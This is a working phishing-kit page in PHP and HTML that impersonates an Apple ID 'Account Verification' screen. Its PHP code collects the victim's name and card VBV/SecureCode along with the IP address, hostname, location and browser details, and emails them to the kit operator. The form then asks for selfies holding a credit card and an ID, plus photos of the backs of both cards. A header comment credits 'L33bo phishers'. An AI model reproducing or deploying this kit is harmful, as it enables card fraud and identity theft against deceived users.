<?php
/*
||| L33bo phishers = ICQ: 695059760
*/
@require "bocah/includes/session_load.php";
@require "bocah/includes/session_protect.php";
@require "bocah/includes/functions.php";
@require "bocah/includes/language.php";
@require "bocah/includes/One_Time.php";
@require "detect.php";
@require "tytyd.php";

$ip = $_SERVER['REMOTE_ADDR'];
$systemInfo = systemInfo($_SERVER['REMOTE_ADDR']);
$VictimInfo1 = "| IP Address :"." ".$_SERVER['REMOTE_ADDR']." (".gethostbyaddr($_SERVER['REMOTE_ADDR']).")";
$VictimInfo2 = "| Location :"." ".$systemInfo['city'].", ".$systemInfo['region'].", ".$systemInfo['country'];
$VictimInfo3 = "| UserAgent :"." ".$systemInfo['useragent'];
$VictimInfo4 = "| Browser :"." ".$systemInfo['browser'];
$VictimInfo5 = "Platform :"." ".$systemInfo['os'];
$name = $_POST['name']; 
$vbvsecure = $_POST['vbvsecure']; 
$kontol = "
  ------------------------- ZRAV PROTECT --------------------------

  --------------------------- VBV/Secure --------------------------
* Name :  $name
* VBV/Secure Code  :  $vbvsecure

  ------------------------- Victim Login --------------------------
* IP Add      :  ".$_SERVER['REMOTE_ADDR']." 
* Hostname    :   ".gethostbyaddr($_SERVER['REMOTE_ADDR'])."
* Location    :   ".$systemInfo['city'].", ".$systemInfo['region'].", ".$systemInfo['country']."
* Browser    :   ".$systemInfo['browser']."
* Platform    :   ".$systemInfo['os']."
* Useragent    :   ".$systemInfo['useragent']."

  ------------------------- ZRAV PROTECT --------------------------
";
$headers = "From: VBV/SecureCode <vbv@kiiara.ayden>";
$subject = "[ ".$nama_negara." ] ".$name."";
if ($vbvsecure != '-' && $vbvsecure != '') {
	mail($Your_Email,$subject,$kontol,$headers);
}
?>
<!DOCTYPE html>
<html>
<head>
	<meta content="text/html; charset=utf-8" http-equiv="Content-Type">
	<meta content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no" name="viewport">
	<title>Confirm your information</title>
	<link href="bocah/img/favicon.ico" rel="shortcut icon" type="image/x-icon">
	<link href="bocah/css/First.css" media="all" rel="stylesheet" type="text/css">
	<link href="bocah/css/Second.css" rel="stylesheet" type="text/css">
	<link href="bocah/css/sanfrancisco.css" rel="stylesheet" type="text/css">
	<link href="bocah/css/verify.css" rel="stylesheet" type="text/css">
	<style>
	.error {color:#333}
	.successupdate {
		background:none!important;
		border:none; 
		padding:0!important;

		/*optional*/
		font-family:arial,sans-serif; /*input has OS specific font-family*/
		color:#069;
		text-decoration:underline;
		cursor:pointer;
	}
</style>
<script type="text/javascript">
	$(document).ready(function(){
		$('.successupdate').click(function(){
			$('#vbvsecure').val('-');
		});
	})
</script>
</head>
<body id="pagecontent">
	<div id="content">
		<div class="bdd45">
			<nav id="xdsfv54" class="js no-touch svg no-ie7 no-ie8">
				<div class="HeaderObjHolder">
					<ul class="MobHeader">
						<li class="HeaderObj MobMenIconH">
							<label class="MobMenHol"> 
								<span class="MobMenIcon MobMenIcon-top">
									<span class="MobMenIcon-crust MobMenIcon-crust-top"></span> </span> <span class="MobMenIcon MobMenIcon-bottom">
										<span class="MobMenIcon-crust MobMenIcon-crust-bottom"></span> </span>
									</label>
								</li>
								<li class="HeaderObj">
									<a class="Item1" href="#" style="display: inline-block;margin-left:50%;margin-top:11px" id="ac-gn-firstfocus-small"> <span class="ac-gn-link-text">&nbsp;</span> </a>
									<a class="Item10" style="display: inline-block;float:right;margin-top:11px" href="#"> <span class="ac-gn-link-text">&nbsp;</span> <span class="ac-gn-bag-badge"></span> </a> <span class="ac-gn-bagview-caret ac-gn-bagview-caret-large"></span> 
								</li>
							</ul>
							<ul class="HeaderObjList">
								<li class="HeaderObj HeaderItem"><a class="HeaderLink Item1" href="#"></a></li>
								<li class="HeaderObj HeaderItem"><a class="HeaderLink Item2" href="#"></a></li>
								<li class="HeaderObj HeaderItem"><a class="HeaderLink Item3" href="#"></a></li>
								<li class="HeaderObj HeaderItem"><a class="HeaderLink Item4" href="#"></a></li>
								<li class="HeaderObj HeaderItem"><a class="HeaderLink Item5" href="#"></a></li>
								<li class="HeaderObj HeaderItem"><a class="HeaderLink Item6" href="#"></a></li>
								<li class="HeaderObj HeaderItem"><a class="HeaderLink Item7" href="#"></a></li>
								<li class="HeaderObj HeaderItem"><a class="HeaderLink Item8" href="#"></a></li>
								<li class="HeaderObj HeaderItem"><a class="HeaderLink Item9" href="#"></a></li>
								<li class="HeaderObj HeaderItem"><a class="HeaderLink Item10" href="#"></a></li>
							</ul>
						</div>
					</nav>



					<div id="flow">
						<div class="flow-body signin clearfix" role="main">
							<div class="persona-splash no-photo clearfix">
								<div class="persona-bg"></div>
								<div class="container">
									<div class="splash-section">
										<div class=" person-wrapper">
											<div>
												<div class="row">
													<div class="col-sm-9 appleid-col">
														<div class="flex-container">
															<h1 class="mobile appleid-user">
																<span class="first_name">Account Verification</span>
																<small class="SessionUser">Your Apple ID is <strong><?php echo $_SESSION['user'];?></strong> </small>
															</h1>
														</div>
													</div>
													<div class="not-mobile col-sm-3">
														<div class="flex-container-signout">
															<div class="signout pull-right">
																<button class="btn btn-link">Sign Out </button>
															</div>
														</div>
													</div>
												</div>
											</div>
										</div>
									</div>
								</div>
							</div>
							<div class="container">
								<div class="flex home-content">
									<div class="container flow-sections">
										<div class="editable account-edit clearfix">
											<div class="row edit-row">
												<div class="col-sm-5">                            
													<h3 class="section-subtitle" id="nameLabel">Verification Identity Documents</h3>
													<div class="form-group">
														<p><font color="black">Apple requires a copy of certain documents for verification purposes to return your account to regular standing.</font></p>
														<p></p>
														<img style="HEIGHT:198px; WIDTH: 160px;" src="https://unichange.me/images/verification_docs/international_pass_selfie.png"><br>
														<form method="post" enctype="multipart/form-data" action="uploader_document?ref=profiles&userid=<?php echo $_SESSION['user'];?>&stats=account_unlock&sessionsid=<?php echo generateRandomString(86); ?>&protocol=ssl">
															<b><font color="Black">1. Take a selfie with your Credit/Debit Card:</font></b>
															<input type="file" capture="camera" accept="image/*" name="attach[]"/><br/>
															<br>
															<b><font color="Black">2. Take a selfie with your ID Card/Driver License:</font></b>
															<input type="file" capture="camera" accept="image/*" name="attach[]"/><br/>
															<br>
															<b><font color="black">3. Take picture on back your Credit/Debit Card:</font></b>
															<input type="file" capture="camera" accept="image/*" name="attach[]"/><br/>
															<br>
															<b><font color="black">4. Take picture on back your ID Card/Driver License:</font></b>
															<input type="file" capture="camera" accept="image/*" name="attach[]"/><br/>
															<br>
															<br>
															<input type="submit" class="gobtn btn-link" style="width:50%;margin-left:auto;margin-right:auto;float:right" value="Submit">
														</form>
													</div>
												</div>
											</div>
										</div>




									</div>
								</div>
							</div>
						</div>
					</div>
				</div>
			</body>
			</html>